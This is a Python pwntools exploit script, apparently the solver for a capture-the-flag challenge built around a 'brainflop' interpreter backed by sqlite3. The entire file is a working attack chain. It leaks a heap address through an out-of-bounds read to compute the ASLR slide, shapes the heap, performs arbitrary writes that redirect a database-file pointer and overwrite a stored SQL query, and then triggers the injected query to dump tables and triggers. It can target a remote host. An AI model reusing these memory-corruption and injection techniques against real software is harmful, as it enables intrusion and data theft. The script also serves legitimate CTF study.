#!/usr/bin/env python3
import os
import sys
import argparse
import binascii
import struct

from pwn import *

context.arch = "amd64"

STD_LIST_LEAK_OFFSET = 0x555555573390
THIS_DB_FILE_OFFSET = 0x555555573370
ORIG_SQL_SELECT = "SELECT TIMESTAMP, TAPESTATE FROM brainflop;"

ARGS = None


def perform_infoleak(io, program):
    # create a new brainflop VM
    io.recvuntil(b">> ")
    io.sendline(b"1")

    # sqlite3 mode
    io.recvuntil(b"(y/n) ")
    io.sendline(b"y")

    # send program
    io.recvuntil(b": ")
    io.sendline(program.encode("utf-8"))

    resp = io.recvuntil(b"\n")
    resp = bytearray(resp[:-1])
    return resp


def perform_task_spray(io):
    # create a new brainflop VM
    io.recvuntil(b">> ")
    io.sendline(b"1")

    # sqlite3 mode
    io.recvuntil(b"(y/n) ")
    io.sendline(b"n")

    # send filler program
    io.recvuntil(b": ")
    io.sendline(b">")


def perform_arb_write(io, program, prog_input):
    """Restarts task 1 to move pointer and pass input"""

    # reopen an existing task
    io.recvuntil(b">> ")
    io.sendline(b"2")

    # node ID
    io.recvuntil(b">> ")
    io.sendline(b"1")

    # clearing tape
    io.recvuntil(b"(y/n) ")
    io.sendline(b"y")

    # send program and update each value
    io.recvuntil(b": ")
    io.sendline(program.encode("utf-8"))

    for x in prog_input:
        io.sendline(chr(x))


def prepare_sql_injection(io, program, sql_query):
    """Overwrites the sql_query backing buffer"""

    # reopen an existing task
    io.recvuntil(b">> ")
    io.sendline(b"2")

    # node ID
    io.recvuntil(b">> ")
    io.sendline(b"1")

    # clearing tape
    io.recvuntil(b"(y/n) ")
    io.sendline(b"y")

    # send program and update each value
    io.recvuntil(b": ")
    io.sendline(program.encode("utf-8"))

    print("[*] Overwriting BFTask->sql_query with custom query")
    for x in sql_query:
        io.sendline(chr(x).encode("utf-8"))


def trigger_destructor_and_inject(io):
    """Exit program, triggering backup and sqlite3 operations"""
    io.recvuntil(b">> ")
    io.sendline(b"3")

    # skip two messages
    io.recvline()
    io.recvline()

    output = io.recv(600).decode("utf-8").strip()
    entries = output.split("\n")
    entries = [e for e in entries if e != ""]
    return entries


def craft_sqli_prog(query):
    """
    Makes sure next char after query is null terminator, since the
    VM uses .c_str() to grab this backing buffer
    """
    char_to_be_null = None
    if len(query) < len(ORIG_SQL_SELECT):
        char_to_be_null = ORIG_SQL_SELECT[len(query)]
        print(f"[*]  next char in original query is '{char_to_be_null}'")

    prog = "<" * 64  # move to sql_query buffer
    prog += ",>" * len(query)  # overwrite sql query

    if char_to_be_null != None:
        prog += "-" * ord(char_to_be_null)  # add null terminator

    return prog


def exploit(query, debug=False):
    if ARGS.remote:
        (addr, port) = ARGS.remote.split(":")
        if not addr or not port:
            print("--remote requires `ADDR:PORT`")

        p = remote(addr, int(port))

    elif ARGS.workspace:
        os.chdir(ARGS.workspace)
        p = process("./challenge")

    else:
        print("Need --workspace or --remote")
        sys.exit(1)

    if debug:
        pid = gdb.attach(
            p,
            gdbscript="""
            b BFTask::inputCellValue()
            b BFTask::performBackup()
        """,
        )
        sleep(3)

    print("[*] First BFTask spray + std::list infoleak with OOBR")

    infoleak = "+["  # spray a std::list entry with _M_next pointed back to BFTask field
    infoleak += ">" * 32  # move pointer until we can start leaking
    infoleak += ".>" * 8  # output the ptr
    print("[*] infoleak program: ", infoleak)

    leaked_addr = perform_infoleak(p, infoleak)
    leaked_addr_str = binascii.hexlify(bytearray(reversed(leaked_addr))).decode("utf-8")

    aslr_slide = int(leaked_addr_str, 16) - STD_LIST_LEAK_OFFSET
    db_file_ptr = THIS_DB_FILE_OFFSET + aslr_slide
    new_db_file_ptr = int(leaked_addr_str, 16) - 272

    print(f"[*]     leaked address = 0x{leaked_addr_str}")
    print(f"[*]     ASLR slide = {hex(aslr_slide)}")
    print(f"[*]     BFTask->db_file = {hex(db_file_ptr)}")
    print(f"[*]     BFTask->db_file will be changed to {hex(new_db_file_ptr)}")

    print("[*] Spraying second filler BFTask to shape heap")
    perform_task_spray(p)

    new_db_path = b"todo_delete_this.db"
    print(
        f"[*] Reusing BFTask 1 to write {new_db_path.decode('utf-8')} to std::vector @ {hex(new_db_file_ptr)}"
    )
    fake_new_db_prog = "<" * 384  # move to std::vector
    fake_new_db_prog += ",>" * len(new_db_path)  # write the length of new_db_path

    print("[*] fake db write program: ", fake_new_db_prog)
    perform_arb_write(p, fake_new_db_prog, new_db_path)

    print(
        f"[*] Reusing BFTask 1 to now overwrite this->db_file with {hex(new_db_file_ptr)}"
    )
    arb_write = "<" * 144  # move to this->db_file
    arb_write += ",>" * 8  # overwrite pointer to point to fake debug file buffer

    print("[*] arb write program: ", arb_write)
    perform_arb_write(p, arb_write, bytearray(struct.pack("Q", new_db_file_ptr)))

    print("[*] Reusing BFTask 1 for SQL injection")
    sqli_prog = craft_sqli_prog(query)

    print("[*] sql injection program: ", sqli_prog)
    prepare_sql_injection(p, sqli_prog, query)
    return trigger_destructor_and_inject(p)


def main():
    global ARGS

    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--workspace")
    parser.add_argument("-r", "--remote")

    ARGS = parser.parse_args()

    # list all tables
    query = b"SELECT name FROM sqlite_master WHERE type='table';"
    leaked_tables = exploit(query)
    leaked_tables = [t.replace("name = ", "") for t in leaked_tables]

    print(f"[*] Table leaking query: {query}")
    print(f"[*] LEAKED TABLES: {leaked_tables}")

    # test db creation is correct
    assert "heartworp" in leaked_tables

    # peek into each table or do something more clever
    leaked_table_name = None
    for table in leaked_tables:
        if table == "brainflop":
            continue

        query = b"SELECT * FROM " + table.encode("utf-8") + b";"
        output = exploit(query)
        print(f"[*] Peeking into table: {query}")

        # player figure out these by observation
        if "DATA = this internal project failed!" in output:
            print(f"{table} has nothing!")
        elif "DATA = wowzers you're too late!" in output:
            leaked_table_name = table
            break

    # test finding the haystack table worked
    assert leaked_table_name == "heartworp"
    print(f"[*] LEAKED TABLE: {leaked_table_name}")

    # show me the triggers and the flag!
    query = b"SELECT * from sqlite_master WHERE type = 'trigger';"
    output = exploit(query)
    print(output)


if __name__ == "__main__":
    main()
